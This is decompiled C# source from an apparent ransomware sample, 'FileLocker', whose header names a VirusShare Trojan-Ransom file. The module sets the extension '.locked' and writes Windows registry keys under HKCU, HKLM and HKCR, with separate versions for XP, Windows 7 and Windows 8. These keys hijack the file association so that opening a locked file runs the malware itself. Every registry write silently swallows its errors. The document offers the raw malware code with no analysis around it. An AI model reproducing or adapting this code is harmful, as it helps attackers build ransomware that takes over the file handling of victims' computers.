// Decompiled with JetBrains decompiler
// Type: FileLocker.AddExtenssionModule
// Assembly: FileLocker, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4E5EE51A-6914-4180-A10A-8B6B85AFF127
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\Trojan-Ransom.Win32.Blocker.ibjo-459a487b0ad80fc56c06fca73eb80b3268bd423eaf6da5a1b400a7b5c19fb957.exe

using FileLocker.My;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.IO;
using System.Windows.Forms;

namespace FileLocker
{
  [StandardModule]
  internal sealed class AddExtenssionModule
  {
    private static RegistryKey regedit;
    public static string Ext;
    public static string f;

    static AddExtenssionModule()
    {
      Class0.SLV0fFIsptsZtjvFft17();
      AddExtenssionModule.Ext = ".locked";
    }

    public static void KU_SubKeyCreate(string string_0, string string_1)
    {
      AddExtenssionModule.regedit = Registry.CurrentUser.OpenSubKey(string_0, true);
      AddExtenssionModule.regedit.CreateSubKey(string_1);
      AddExtenssionModule.regedit.Close();
    }

    public static void LM_SubKeyCreate(string string_0, string string_1)
    {
      AddExtenssionModule.regedit = Registry.LocalMachine.OpenSubKey(string_0, true);
      AddExtenssionModule.regedit.CreateSubKey(string_1);
      AddExtenssionModule.regedit.Close();
    }

    public static void CR_SubKeyCreate(string string_0, string string_1)
    {
      AddExtenssionModule.regedit = Registry.ClassesRoot.OpenSubKey(string_0, true);
      AddExtenssionModule.regedit.CreateSubKey(string_1);
      AddExtenssionModule.regedit.Close();
    }

    public static void KU_KeyCreate(string string_0, string string_1, string string_2)
    {
      AddExtenssionModule.regedit = Registry.CurrentUser.OpenSubKey(string_0, true);
      AddExtenssionModule.regedit.SetValue(string_1, (object) string_2);
      AddExtenssionModule.regedit.Close();
    }

    public static void CR_KeyCreate(string string_0, string string_1, string string_2)
    {
      AddExtenssionModule.regedit = Registry.ClassesRoot.OpenSubKey(string_0, true);
      AddExtenssionModule.regedit.SetValue(string_1, (object) string_2);
      AddExtenssionModule.regedit.Close();
    }

    public static void LM_KeyCreate(string string_0, string string_1, string string_2)
    {
      AddExtenssionModule.regedit = Registry.LocalMachine.OpenSubKey(string_0, true);
      AddExtenssionModule.regedit.SetValue(string_1, (object) string_2);
      AddExtenssionModule.regedit.Close();
    }

    public static void AddExtenssion_Windows7()
    {
      FileInfo fileInfo = new FileInfo(Application.ExecutablePath);
      try
      {
        AddExtenssionModule.KU_SubKeyCreate("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\", AddExtenssionModule.Ext);
        AddExtenssionModule.KU_SubKeyCreate("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\" + AddExtenssionModule.Ext + "\\", "OpenWithList");
        AddExtenssionModule.KU_KeyCreate("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\" + AddExtenssionModule.Ext + "\\OpenWithList", "a", fileInfo.Name);
        AddExtenssionModule.KU_KeyCreate("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\" + AddExtenssionModule.Ext + "\\OpenWithList", "MRUList", "a");
        AddExtenssionModule.KU_SubKeyCreate("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\" + AddExtenssionModule.Ext + "\\", "OpenWithProgids");
        AddExtenssionModule.KU_KeyCreate("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\" + AddExtenssionModule.Ext + "\\OpenWithProgids", "inifile", "00 00 00 00");
        AddExtenssionModule.KU_SubKeyCreate("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\" + AddExtenssionModule.Ext + "\\", "UserChoice");
        AddExtenssionModule.KU_KeyCreate("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\" + AddExtenssionModule.Ext + "\\UserChoice", "Progid", "Applications\\" + fileInfo.Name);
        AddExtenssionModule.KU_SubKeyCreate("Software\\Classes\\", "Applications");
        AddExtenssionModule.KU_SubKeyCreate("Software\\Classes\\Applications\\", fileInfo.Name);
        AddExtenssionModule.KU_SubKeyCreate("Software\\Classes\\Applications\\" + fileInfo.Name, "shell");
        AddExtenssionModule.KU_SubKeyCreate("Software\\Classes\\Applications\\" + fileInfo.Name + "\\shell", "open");
        AddExtenssionModule.KU_SubKeyCreate("Software\\Classes\\Applications\\" + fileInfo.Name + "\\shell\\open", "command");
        AddExtenssionModule.KU_KeyCreate("Software\\Classes\\Applications\\" + fileInfo.Name + "\\shell\\open\\command", "", AddExtenssionModule.f + Application.ExecutablePath + AddExtenssionModule.f + " " + AddExtenssionModule.f + "%1" + AddExtenssionModule.f);
        AddExtenssionModule.KU_KeyCreate("Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache", Application.ExecutablePath, fileInfo.Name);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void AddExtenssion_WindpwsXP()
    {
      FileInfo fileInfo = new FileInfo(Application.ExecutablePath);
      string str = AddExtenssionModule.Ext.Replace(".", "") + "_auto_file";
      try
      {
        AddExtenssionModule.LM_SubKeyCreate("SOFTWARE\\Classes\\", AddExtenssionModule.Ext);
        AddExtenssionModule.LM_KeyCreate("SOFTWARE\\Classes\\" + AddExtenssionModule.Ext, "", str);
        AddExtenssionModule.LM_SubKeyCreate("SOFTWARE\\Classes\\", str);
        AddExtenssionModule.LM_SubKeyCreate("SOFTWARE\\Classes\\" + str + "\\", "shell");
        AddExtenssionModule.LM_SubKeyCreate("SOFTWARE\\Classes\\" + str + "\\shell\\", "open");
        AddExtenssionModule.LM_SubKeyCreate("SOFTWARE\\Classes\\" + str + "\\shell\\open", "command");
        AddExtenssionModule.LM_KeyCreate("SOFTWARE\\Classes\\" + str + "\\shell\\open\\command", "", AddExtenssionModule.f + Application.ExecutablePath + AddExtenssionModule.f + " " + AddExtenssionModule.f + "%1" + AddExtenssionModule.f);
        AddExtenssionModule.KU_SubKeyCreate("Software\\Classes\\Applications\\", fileInfo.Name);
        AddExtenssionModule.KU_SubKeyCreate("SOFTWARE\\Classes\\Applications\\" + fileInfo.Name + "\\", "shell");
        AddExtenssionModule.KU_SubKeyCreate("SOFTWARE\\Classes\\Applications\\" + fileInfo.Name + "\\shell\\", "open");
        AddExtenssionModule.KU_SubKeyCreate("SOFTWARE\\Classes\\Applications\\" + fileInfo.Name + "\\shell\\open", "command");
        AddExtenssionModule.KU_KeyCreate("SOFTWARE\\Classes\\Applications\\" + fileInfo.Name + "\\shell\\open\\command", "", AddExtenssionModule.f + Application.ExecutablePath + AddExtenssionModule.f + " " + AddExtenssionModule.f + "%1" + AddExtenssionModule.f);
        AddExtenssionModule.CR_SubKeyCreate("Applications\\", fileInfo.Name);
        AddExtenssionModule.CR_SubKeyCreate("Applications\\" + fileInfo.Name + "\\", "shell");
        AddExtenssionModule.CR_SubKeyCreate("Applications\\" + fileInfo.Name + "\\shell\\", "open");
        AddExtenssionModule.CR_SubKeyCreate("Applications\\" + fileInfo.Name + "\\shell\\open\\", "command");
        AddExtenssionModule.CR_KeyCreate("Applications\\" + fileInfo.Name + "\\shell\\open\\command\\", "", AddExtenssionModule.f + Application.ExecutablePath + AddExtenssionModule.f + " " + AddExtenssionModule.f + "%1" + AddExtenssionModule.f);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void AddExtenssion_Windows8()
    {
      FileInfo fileInfo = new FileInfo(Application.ExecutablePath);
      string str = AddExtenssionModule.Ext.Replace(".", "") + "_auto_file";
      try
      {
        AddExtenssionModule.KU_SubKeyCreate("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\", AddExtenssionModule.Ext);
        AddExtenssionModule.KU_SubKeyCreate("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\" + AddExtenssionModule.Ext + "\\", "OpenWithList");
        AddExtenssionModule.KU_KeyCreate("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\" + AddExtenssionModule.Ext + "\\OpenWithList", "a", fileInfo.Name);
        AddExtenssionModule.KU_KeyCreate("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\" + AddExtenssionModule.Ext + "\\OpenWithList", "MRUList", "a");
        AddExtenssionModule.KU_SubKeyCreate("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\" + AddExtenssionModule.Ext + "\\", "OpenWithProgids");
        MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\" + AddExtenssionModule.Ext + "\\OpenWithProgids", str, (object) new byte[1]
        {
          (byte) 0
        }, RegistryValueKind.Binary);
        AddExtenssionModule.KU_SubKeyCreate("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\" + AddExtenssionModule.Ext + "\\", "UserChoice");
        AddExtenssionModule.KU_KeyCreate("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\" + AddExtenssionModule.Ext + "\\UserChoice", "Progid", str);
        AddExtenssionModule.KU_KeyCreate("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\" + AddExtenssionModule.Ext + "\\UserChoice", "Hash", "Dg0lCXPYJXE=");
        AddExtenssionModule.KU_SubKeyCreate("Software\\Classes\\", "Applications");
        AddExtenssionModule.KU_SubKeyCreate("Software\\Classes\\Applications\\", fileInfo.Name);
        AddExtenssionModule.KU_SubKeyCreate("Software\\Classes\\Applications\\" + fileInfo.Name, "shell");
        AddExtenssionModule.KU_SubKeyCreate("Software\\Classes\\Applications\\" + fileInfo.Name + "\\shell", "open");
        AddExtenssionModule.KU_SubKeyCreate("Software\\Classes\\Applications\\" + fileInfo.Name + "\\shell\\open", "command");
        AddExtenssionModule.KU_KeyCreate("Software\\Classes\\Applications\\" + fileInfo.Name + "\\shell\\open\\command", "", AddExtenssionModule.f + Application.ExecutablePath + AddExtenssionModule.f + " " + AddExtenssionModule.f + "%1" + AddExtenssionModule.f);
        AddExtenssionModule.KU_SubKeyCreate("Software\\Classes\\", AddExtenssionModule.Ext);
        AddExtenssionModule.KU_KeyCreate("Software\\Classes\\" + AddExtenssionModule.Ext, "", str);
        AddExtenssionModule.KU_SubKeyCreate("Software\\Classes\\" + str, AddExtenssionModule.Ext);
        AddExtenssionModule.KU_SubKeyCreate("SOFTWARE\\Classes\\" + str + "\\", "shell");
        AddExtenssionModule.KU_SubKeyCreate("SOFTWARE\\Classes\\" + str + "\\shell\\", "open");
        AddExtenssionModule.KU_SubKeyCreate("SOFTWARE\\Classes\\" + str + "\\shell\\open", "command");
        AddExtenssionModule.KU_KeyCreate("SOFTWARE\\Classes\\" + str + "\\shell\\open\\command", "", AddExtenssionModule.f + Application.ExecutablePath + AddExtenssionModule.f + " " + AddExtenssionModule.f + "%1" + AddExtenssionModule.f);
        AddExtenssionModule.CR_SubKeyCreate("\\", AddExtenssionModule.Ext);
        AddExtenssionModule.CR_KeyCreate("\\" + AddExtenssionModule.Ext, "", str);
        AddExtenssionModule.CR_SubKeyCreate("Applications\\", fileInfo.Name);
        AddExtenssionModule.CR_SubKeyCreate("Applications\\" + fileInfo.Name + "\\", "shell");
        AddExtenssionModule.CR_SubKeyCreate("Applications\\" + fileInfo.Name + "\\shell\\", "open");
        AddExtenssionModule.CR_SubKeyCreate("Applications\\" + fileInfo.Name + "\\shell\\open\\", "command");
        AddExtenssionModule.CR_KeyCreate("Applications\\" + fileInfo.Name + "\\shell\\open\\command\\", "", AddExtenssionModule.f + Application.ExecutablePath + AddExtenssionModule.f + " " + AddExtenssionModule.f + "%1" + AddExtenssionModule.f);
        AddExtenssionModule.KU_SubKeyCreate("Software\\Microsoft\\Windows\\Roaming\\OpenWith\\FileExts\\", AddExtenssionModule.Ext);
        AddExtenssionModule.KU_SubKeyCreate("Software\\Microsoft\\Windows\\Roaming\\OpenWith\\FileExts\\" + AddExtenssionModule.Ext + "\\", "UserChoice");
        AddExtenssionModule.KU_KeyCreate("Software\\Microsoft\\Windows\\Roaming\\OpenWith\\FileExts\\" + AddExtenssionModule.Ext + "\\UserChoice", "Hash", "Dg0lCXPYJXE=");
        AddExtenssionModule.KU_KeyCreate("Software\\Microsoft\\Windows\\Roaming\\OpenWith\\FileExts\\" + AddExtenssionModule.Ext + "\\UserChoice", "ProgId", str);
        AddExtenssionModule.KU_SubKeyCreate("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\", AddExtenssionModule.Ext);
        AddExtenssionModule.KU_KeyCreate("Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache", Application.ExecutablePath, fileInfo.Name);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void AddExtenssion()
    {
      string osFullName = MyProject.Computer.Info.OSFullName;
      if (osFullName.Contains("7"))
        AddExtenssionModule.AddExtenssion_Windows7();
      else if (osFullName.Contains("XP"))
        AddExtenssionModule.AddExtenssion_WindpwsXP();
      else if (osFullName.Contains("Vista"))
        AddExtenssionModule.AddExtenssion_Windows7();
      else
        AddExtenssionModule.AddExtenssion_Windows8();
    }
  }
}
